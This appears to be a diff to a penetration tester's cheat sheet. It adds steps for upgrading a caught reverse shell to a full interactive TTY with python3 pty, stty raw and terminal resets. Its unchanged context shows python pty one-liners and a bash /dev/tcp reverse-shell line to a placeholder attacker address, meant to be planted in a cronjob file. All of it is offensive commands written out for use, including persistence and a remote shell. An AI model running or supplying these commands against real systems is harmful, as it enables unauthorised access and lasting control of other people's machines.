@@ -32,6 +32,19 @@ python2 -c 'import pty;pty.spawn("bin/bash")'
 python3 -c 'import pty;pty.spawn("bin/bash")'
 export TERM=xterm
 
+# In reverse shell:
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+# Press Ctrl+Z
+# On Kali:
+stty raw -echo; fg
+# Press Enter twice
+# In reverse shell:
+reset
+export SHELL=bash
+export TERM=xterm-256color
+stty rows 24 columns 80
+
+
 spawn a reverse shell inside a cronjob file:
 
 bash -i >& /dev/tcp/<AM_IP>/<AM_port> 0>&1
